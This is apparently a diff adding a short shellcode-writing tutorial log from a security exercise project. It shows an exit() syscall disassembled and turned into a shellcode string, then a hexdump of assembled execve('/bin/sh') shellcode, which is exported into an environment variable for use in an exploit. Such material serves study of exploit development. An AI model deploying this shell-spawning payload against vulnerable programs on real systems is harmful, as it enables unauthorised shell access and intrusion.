@@ -1,0 +1,35 @@
+Shawn the R0ck - Dec 31 2013
+------------------------------------------------------
+shawn@kali-test:~/citypw-SCFE/exit$ make
+gcc -g -static -masm=intel -o exit exit.c
+exit.c: In function ‘main’:
+exit.c:3:1: warning: incompatible implicit declaration of built-in function ‘exit’ [enabled by default]
+nasm -f elf  asm_exit.s
+ld -o asm_exit asm_exit.o
+done
+shawn@kali-test:~/citypw-SCFE/exit$ objdump -M intel -d asm_exit
+
+asm_exit:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:	bb 00 00 00 00       	mov    ebx,0x0
+ 8048065:	b8 01 00 00 00       	mov    eax,0x1
+ 804806a:	cd 80                	int    0x80
+
+So, the original shellcode would be like:
+char *ori_shellcode = "\xbb\x00\x00\x00\x00"
+			"\xb8\x01\x00\x00\x00"
+			"\xcd\x80";
+
+
+Use the shellcode in another way:
+shawn@kali-test:~/citypw-SCFE/exit$ nasm spawn.s 
+shawn@kali-test:~/citypw-SCFE/exit$ hexdump -C spawn
+00000000  eb 16 5b 31 c0 88 43 07  89 5b 08 89 43 0c 8d 4b  |..[1..C..[..C..K|
+00000010  08 8d 53 0c b0 0b cd 80  e8 e5 ff ff ff 2f 62 69  |..S........../bi|
+00000020  6e 2f 73 68 58 31 33 33  37 42 30 35 35           |n/shX1337B055|
+0000002d
+shawn@kali-test:~/citypw-SCFE/exit$ export SHELLCODE=$(cat spawn)
